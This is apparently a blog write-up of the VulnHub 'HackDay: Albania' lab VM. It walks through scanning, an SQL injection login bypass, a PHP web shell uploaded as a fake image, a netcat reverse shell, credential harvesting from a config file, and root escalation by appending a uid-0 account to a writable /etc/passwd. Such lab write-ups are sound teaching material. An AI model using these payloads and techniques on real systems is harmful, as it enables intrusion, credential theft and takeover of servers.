---
title:  "VulnHub HackDay Albania Writeup"
date:   2016-11-26 00:00:00
description: A Fun One
---

This is a writeup for VulnHub's [HackDay: Albania](https://www.vulnhub.com/entry/hackday-albania,167/) challenge.

### Host Discovery

I started by checking around my network for the host's IP address, and I found the host at 192.168.0.105.

```
$ nmap 192.168.0.100-120

Starting Nmap 7.01 ( https://nmap.org ) at 2016-11-20 19:55 WIB
Nmap scan report for 192.168.0.100
Host is up (0.014s latency).

Nmap scan report for 192.168.0.105
Host is up (0.00013s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8008/tcp open  http
```

It has two services running, SSH daemon and HTTP server. I went with the HTTP server while running a more aggressive Nmap scan for other ports.

```
$ sudo nmap -sS -Pn 192.168.0.105 -p- -T4 -vvv
```

But no other open ports found, so we'll proceed with the web server.

### Web Server at Port 8008

It shows Mr Robot background.

![Mr Robot](/assets/images/posts/hackday-albania-port-8008.png)

The text is in Albanian. Here's the translation.

```
Welcome - If it's me, I know where to go ;)
```

Checking out the page source, I discovered another comment in Albanian.

```html

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>HackDay Albania 2016</title>
  <link rel="stylesheet" href="js/jquery-ui.css">
  <script src="js/jquery-3.1.1.min.js"></script>
  <script src="js/jquery-ui.js"></script>
  <style type="text/css">
    body {
      background-image: url("bg.png");
      background-repeat: no-repeat;
      background-size: cover;
    }
    .ui-draggable .ui-dialog-titlebar{
      background-color: #f05b43;
    }
    .ui-dialog .ui-dialog-title{
      color: white;
    }

  </style>
  <script>
    $(document).ready(function(){
      $("#dialog").dialog();
    });
  </script>
</head>
<body>
  <div id="dialog" title="Miresevini">
  <p>Ne qofte se jam UNE, e di se ku te shkoj ;)</p>
</div>

<!--OK ok, por jo ketu :)-->
</body>
</html>
```

The translation for the comment is as follows.

```
OK ok, but not here :)
```

We can see there's a `/js/` directory. The site also has a `robots.txt` file with the following entry.

```
Disallow: /rkfpuzrahngvat/
Disallow: /slgqvasbiohwbu/
Disallow: /tmhrwbtcjpixcv/
Disallow: /vojtydvelrkzex/
Disallow: /wpkuzewfmslafy/
Disallow: /xqlvafxgntmbgz/
Disallow: /yrmwbgyhouncha/
Disallow: /zsnxchzipvodib/
Disallow: /atoydiajqwpejc/
Disallow: /bupzejbkrxqfkd/
Disallow: /cvqafkclsyrgle/
Disallow: /unisxcudkqjydw/
Disallow: /dwrbgldmtzshmf/
Disallow: /exschmenuating/
Disallow: /fytdinfovbujoh/
Disallow: /gzuejogpwcvkpi/
Disallow: /havfkphqxdwlqj/
Disallow: /ibwglqiryexmrk/
Disallow: /jcxhmrjszfynsl/
Disallow: /kdyinsktagzotm/
Disallow: /lezjotlubhapun/
Disallow: /mfakpumvcibqvo/
Disallow: /ngblqvnwdjcrwp/
Disallow: /ohcmrwoxekdsxq/
Disallow: /pidnsxpyfletyr/
Disallow: /qjeotyqzgmfuzs/
```

The `/js/` and every single one of the `robots.txt` entry will show this page.

![Albanian Philosoraptor](/assets/images/posts/hackday-albania-raptor-meme.png)

But not the `/unisxcudkqjydw/` directory. Opening this directory will get us this text.

```
IS there any /vulnbank/ in there ???
```

So I opened the `/unisxcudkqjydw/vulnbank/` directory and found another directory called `/client/`. Opening `/unisxcudkqjydw/vulnbank/client/` directory will get us this login panel.

![Very Secure Bank](/assets/images/posts/hackday-albania-very-secure-bank.png)

### Very Secure Bank

I ran Nikto while checking for SQL injection vulnerability on the login panel.

![SQL Injection](/assets/images/posts/hackday-albania-very-secure-bank-sqli.png)

The bank is vulnerable to SQL injection for sure, but it's filtering out the "or" operation. So I used this payload to get around it.

```
' || 1=1#
```

Meanwhile, Nikto doesn't seem to find anything useful.

```
$ nikto -h http://192.168.0.105:8008/unisxcudkqjydw/vulnbank/client/
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          192.168.0.105
+ Target Hostname:    192.168.0.105
+ Target Port:        8008
+ Start Time:         2016-11-20 20:20:06 (GMT7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ Retrieved x-powered-by header: PHP/7.0.8-0ubuntu0.16.04.3
+ The anti-clickjacking X-Frame-Options header is not present.
+ Root page / redirects to: login.php
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1/unisxcudkqjydw/vulnbank/client/images/".
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ /unisxcudkqjydw/vulnbank/client/config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /unisxcudkqjydw/vulnbank/client/images/: Directory indexing found.
+ OSVDB-3268: /unisxcudkqjydw/vulnbank/client/images/?pattern=/etc/*&sort=name: Directory indexing found.
+ /unisxcudkqjydw/vulnbank/client/login.php: Admin login page/section found.
+ 6544 items checked: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2016-11-20 20:20:15 (GMT7) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

The `/images/` directory only has the bank's logo and a doge meme. I found nothing in those images.

The SQL injection got me the login of Charles D. Hobson.

![Charles D. Hobson](/assets/images/posts/hackday-albania-very-secure-bank-charles-hobson.png)

### Ticket Submission

I tried submitting a support ticket, with the Doge meme I found in the `/images/` directory earlier as the image attachment.

![Doge Image Upload](/assets/images/posts/hackday-albania-very-secure-bank-ticket-image-upload.png)

The image address is as follows.

```
http://192.168.0.105:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=meme.jpg
```

Tried checking for directory traversal on the `filename` parameter.

```
http://192.168.0.105:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=../../../../../../../../../../../../../etc/passwd%00.jpg
```

But it doesn't seem to work.

```
Warning: include(): Failed opening 'upload/../../../../../../../../../../../../../etc/passwd' for inclusion (include_path='.:/usr/share/php') in /var/www/html/unisxcudkqjydw/vulnbank/client/view_file.php on line 13
```

I tried uploading a PHP file named `shell.php` with this payload for another ticket.

```php
<?php
echo '<pre>';
echo system($_GET['cmd']);
echo '</pre>';
?>
```

The site doesn't allow files other than images to be uploaded.

So I renamed the PHP file to `shell.php` and tried to reupload it. It's uploaded and I can run shell commands using the PHP script.

```
http://192.168.0.105:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=shell.jpg&cmd=ls%20-alh
```

It ran the command. So I proceed by uploading a PHP reverse shell script after renaming the file tp `php-reverse-shell.jpg`.

Now I started a listener on my host with Netcat.

```
$ nc -v -n -l -p 1234
```

And then I got the PHP reverse shell to connect back.

```
http://192.168.0.105:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=php-reverse-shell.jpg
```

I got in with the privilege of user www-data.

### Reverse Shell

First, I tried to get my hand on a tty shell.

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Probing the web files, I checked out the `config.php` file and found the following lines.

```php
$db_host = "127.0.0.1";
$db_name = "bank_database";
$db_user = "root";
$db_password = "NuCiGoGo321";
```

I also found that there's another user in the host. The username is taviso.

"NuCiGoGo321" doesn't work as the password for either root or taviso. So I checked out the database content.

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| bank_database      |
| mysql              |
| performance_schema |
| sys                |
| vulnbank           |
+--------------------+
6 rows in set (0.07 sec)
```

Both vulnbank and bank_database has the same tables, but vulnbank's tables are empty.

The following are the tables.

```
mysql> use bank_database;
use bank_database;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-------------------------+
| Tables_in_bank_database |
+-------------------------+
| klienti                 |
| tickets                 |
+-------------------------+
2 rows in set (0.00 sec)
```

The tickets table's content is the tickets we entered before. Here's the content of the klienti table.

```
mysql> select * from klienti;
+----+-------------+---------+---------+----------+------------+
| ID | emer        | mbiemer | bilanci | username | password   |
+----+-------------+---------+---------+----------+------------+
|  1 | Charles D.  | Hobson  |   25000 | hobson   | Charles123 |
|  2 | Jeffery
   | Fischer |  120000 | jeff     | jeff321    |
+----+-------------+---------+---------+----------+------------+
2 rows in set (0.00 sec)
```

None of the password works for both taviso and root.

### Privilege Escalation

I tried to look for files that might be vulnerable to privilege escalation.

```
$ find / -user root -perm -4000 -exec ls -ldb {} \; > /tmp/rootcheck.txt
$ find / -user taviso -perm -4000 -exec ls -ldb {} \; > /tmp/tavisocheck.txt
```

Looks like nothing's usable. I checked the kernel version, hoping for a Dirty COW vulnerability to escalate my privilege using the [cowroot exploit](https://www.exploit-db.com/exploits/40616/).

```
$ uname -r
4.4.0-45-generic
```

Nope, it's already patched on this kernel version.

After inspecting the server for a while, I found that `/etc/passwd` is writable by the user www-data.

I made a backup of the `/etc/passwd` file in `/tmp/passwd.bak` in case something happens as I tinkered with the `/etc/passwd`, and tried to make myself an account with root access.

I ended up adding this line to `/etc/passwd` to create an account named sdsdkkk with root privilege.

```
sdsdkkk:[password_hash]:0:0:sdsdkkk:/:/bin/bash
```

I censored the password hash, since it's taken from one of the accounts in my /etc/shadow. After that, I switch user to sdsdkkk using the same password with the user on my host.

```
$ su sdsdkkk
```

Now, we got the root access!

### The Flag

I went to the `/root` directory to see what's inside. There's a file named `flag.txt` there.

So here's our flag!

```
Urime, 
Tani nis raportin!

d5ed38fdbf28bc4e58be142cf5a17cf5
```

The text in Albanian said this.

```
Congratulations,
Now start writing the report!
```

That's all, folks! Thanks for uploading the challenge to VulnHub, [R-73eN](https://www.vulnhub.com/author/r-73en,369/)!